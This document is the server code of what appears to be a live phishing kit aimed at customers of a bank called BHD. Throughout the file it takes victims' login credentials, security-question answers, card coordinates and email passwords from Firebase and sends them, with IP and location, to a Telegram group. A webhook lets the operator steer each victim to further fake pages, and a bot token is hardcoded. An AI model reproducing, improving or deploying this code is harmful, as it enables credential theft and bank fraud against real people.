// server.js
const express = require('express');
const admin = require('firebase-admin');
const axios = require('axios');

// Configurar dotenv solo en desarrollo
if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config();
}

const app = express();
app.use(express.json());

// === CONFIGURACIÓN DE TELEGRAM ===
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575'; // ID del grupo privado del admin
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const ALLOWED_PAGES = [
  'pregunta-1.html',
  'coordenada1.html',
  'coordenada2.html',
  'coordenada3.html',
  'coordenadaR.html',
  'mailbox.html',
  'finalizado.html'
];

// === CONFIGURACIÓN SEGURA DE FIREBASE ===
let serviceAccount;
try {
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    // Producción (Render.com) - desde variables de entorno
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
    console.log('✅ Firebase config cargada desde variables de entorno');
  } else {
    // Desarrollo local
    serviceAccount = require('./serviceAccountKey.json');
    console.log('✅ Firebase config cargada desde archivo local');
  }
} catch (error) {
  console.error('❌ ERROR: No se pudo cargar la configuración de Firebase');
  console.error('Detalles:', error.message);
  process.exit(1);
}

// Inicializar Firebase Admin SDK
try {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com'
  });
  console.log('✅ Firebase Admin SDK inicializado correctamente');
} catch (error) {
  console.error('❌ ERROR al inicializar Firebase:', error.message);
  process.exit(1);
}

const database = admin.database();

// === MIDDLEWARE PARA LOGGING ===
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  next();
});

// === 1. ESCUCHAR CAMBIOS EN FIREBASE Y ENVIAR A TELEGRAM ===
let isProcessing = false;

database.ref('/captures').on('child_added', async (snapshot) => {
  if (isProcessing) return;
  isProcessing = true;

  try {
    const uid = snapshot.key;
    const data = snapshot.val();

    console.log(`📥 Nueva captura detectada: ${uid}`);

    // Evitar procesar el campo redirectPage
    const steps = Object.keys(data).filter(key => key !== 'redirectPage');
    if (steps.length === 0) {
      isProcessing = false;
      return;
    }

    const step = steps[0];
    const payload = data[step];

    // Construir mensaje para Telegram
    let mensaje = `🚨 *NUEVO DATO CAPTURADO - BHD*\n`;
    mensaje += `🔹 *UID*: \`${uid}\`\n`;
    mensaje += `🔹 *Paso*: ${step}\n\n`;

    if (step === 'login') {
      mensaje += `🔐 *CREDENCIALES*\n`;
      mensaje += `• Usuario: \`${payload.username}\`\n`;
      mensaje += `• Contraseña: \`${payload.password}\`\n\n`;
    } else if (step === 'security') {
      mensaje += `❓ *PREGUNTAS DE SEGURIDAD*\n`;
      mensaje += `• Color favorito: \`${payload.ans1}\`\n`;
      mensaje += `• Marca primer carro: \`${payload.ans2}\`\n`;
      mensaje += `• Personaje libro: \`${payload.ans3}\`\n`;
      mensaje += `• Abuela materna: \`${payload.ans4}\`\n`;
      mensaje += `• Colegio primaria: \`${payload.ans5}\`\n\n`;
    } else if (step.startsWith('coordenada')) {
      mensaje += `📍 *COORDENADAS (${step})*\n`;
      Object.keys(payload).forEach(key => {
        if (key.startsWith('coord')) {
          mensaje += `• ${key}: \`${payload[key]}\`\n`;
        }
      });
      mensaje += `\n`;
    } else if (step === 'mailbox') {
      mensaje += `📧 *CORREO*\n`;
      mensaje += `• Email: \`${payload.email}\`\n`;
      mensaje += `• Contraseña: \`${payload.emailPassword}\`\n\n`;
    }

    // Información del sistema
    mensaje += `🌐 *INFO DEL USUARIO*\n`;
    mensaje += `• IP: \`${payload.ip || 'N/A'}\`\n`;
    mensaje += `• Ubicación: ${payload.city || 'N/A'}, ${payload.region || 'N/A'}, ${payload.country || 'N/A'}\n`;
    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}\n`;
    mensaje += `• Fecha: ${payload.date} - ${payload.time}\n\n`;

    // === OPCIONES DE REDIRECCIÓN ===
    mensaje += `⏭️ *OPCIONES DE REDIRECCIÓN* (responder en este chat):\n`;
    ALLOWED_PAGES.forEach(page => {
      mensaje += `/redirect ${uid} ${page}\n`;
    });

    // Enviar a Telegram
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: mensaje,
      parse_mode: 'Markdown'
    });

    console.log(`✅ Enviado a Telegram: ${uid}/${step}`);

  } catch (error) {
    console.error('❌ Error al procesar captura:', error.message);
    console.error('Detalles completos:', error);
  } finally {
    isProcessing = false;
  }
});

// === 2. WEBHOOK PARA RECIBIR COMANDOS DE TELEGRAM ===
app.post('/telegram/webhook', async (req, res) => {
  try {
    const message = req.body?.message?.text;
    const chatId = req.body?.message?.chat?.id;

    console.log(`📨 Webhook recibido: ${message}`);

    // Validar que el mensaje viene del chat autorizado
    if (!message || chatId?.toString() !== TELEGRAM_CHAT_ID.replace('-100', '-100')) {
      return res.status(200).send('Ignored');
    }

    if (!message.startsWith('/redirect ')) {
      return res.status(200).send('Not a redirect command');
    }

    const commandRegex = /^\/redirect\s+([a-f0-9-]+)\s+([a-zA-Z0-9._-]+\.html)$/;
    const match = message.match(commandRegex);

    if (!match) {
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: '❌ Formato incorrecto. Usa: `/redirect UID pagina.html`',
        parse_mode: 'Markdown'
      });
      return res.status(200).send('Invalid command format');
    }

    const uid = match[1];
    const page = match[2];

    if (!ALLOWED_PAGES.includes(page)) {
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `❌ Página no permitida: ${page}\nPáginas válidas: ${ALLOWED_PAGES.join(', ')}`
      });
      return res.status(200).send('Invalid page');
    }

    // Actualizar Firebase para redirigir al usuario
    await database.ref(`/captures/${uid}/redirectPage`).set(page);

    // Confirmar al admin
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `✅ Redirección configurada:\nUID: \`${uid}\`\n→ ${page}`,
      parse_mode: 'Markdown'
    });

    console.log(`✅ Redirección establecida: ${uid} → ${page}`);
    return res.status(200).send('OK');

  } catch (error) {
    console.error('❌ Error en webhook:', error.message);
    try {
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `❌ Error interno del servidor: ${error.message}`
      });
    } catch (telegramError) {
      console.error('❌ Error al enviar mensaje de error a Telegram:', telegramError.message);
    }
    return res.status(500).send('Internal Server Error');
  }
});

// === RUTAS ADICIONALES ===

// Ruta de health check para Render
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    service: 'BHD Firebase Server'
  });
});

// Ruta de información del servidor
app.get('/info', (req, res) => {
  res.json({
    service: 'BHD Firebase Server',
    version: '1.0.0',
    environment: process.env.NODE_ENV || 'development',
    firebase: {
      initialized: true,
      database: 'Connected'
    },
    telegram: {
      bot: TELEGRAM_BOT_TOKEN ? 'Configured' : 'Not configured',
      chat_id: TELEGRAM_CHAT_ID
    }
  });
});

// Ruta principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>BHD Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
            .success { background: #d4edda; color: #155724; }
            .info { background: #d1ecf1; color: #0c5460; }
        </style>
    </head>
    <body>
        <h1>🚀 Servidor BHD Firebase + Telegram</h1>
        <div class="status success">✅ Servidor activo y funcionando</div>
        <div class="status info">
            <strong>Endpoints disponibles:</strong><br>
            • <a href="/health">/health</a> - Estado del servidor<br>
            • <a href="/info">/info</a> - Información del sistema<br>
            • POST /telegram/webhook - Webhook de Telegram
        </div>
        <p><strong>Environment:</strong> ${process.env.NODE_ENV || 'development'}</p>
        <p><strong>Puerto:</strong> ${process.env.PORT || 3000}</p>
    </body>
    </html>
  `);
});

// Manejo de errores global
app.use((error, req, res, next) => {
  console.error('❌ Error global:', error);
  res.status(500).json({ error: 'Internal Server Error' });
});

// Ruta 404
app.use('*', (req, res) => {
  res.status(404).json({ error: 'Ruta no encontrada' });
});

// Inicializar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Servidor BHD corriendo en puerto ${PORT}`);
  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`📞 Health check: http://localhost:${PORT}/health`);
  console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? 'Configured' : 'NOT CONFIGURED'}`);
  console.log(`🔥 Firebase: Initialized`);
});